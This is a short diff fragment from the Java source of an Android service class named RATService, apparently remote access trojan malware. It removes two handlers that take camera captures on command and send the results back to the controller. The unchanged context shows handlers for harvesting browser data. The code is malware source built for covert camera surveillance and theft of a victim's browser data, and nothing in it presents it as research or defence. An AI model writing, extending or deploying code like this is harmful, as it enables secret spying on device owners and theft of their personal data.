@@ -1405,24 +1405,6 @@ public class RATService extends Service {
                 }
                 break;
 
-            case "camera_simple_test":
-                if (cameraModule != null) {
-                    String result = cameraModule.simpleTest();
-                    sendCommand("CAMERA_SIMPLE_TEST|" + result);
-                } else {
-                    sendCommand("CAMERA_SIMPLE_TEST|ERROR: Camera module not available");
-                }
-                break;
-
-            case "camera_simple_capture":
-                if (cameraModule != null) {
-                    String result = cameraModule.simpleCapture();
-                    sendCommand("CAMERA_SIMPLE|" + result);
-                } else {
-                    sendCommand("CAMERA_SIMPLE|ERROR: Camera module not available");
-                }
-                break;
-
             // ── BROWSER ──────────────────────────────────────────────────────
             case "browser_data":
             case "get_browsers":
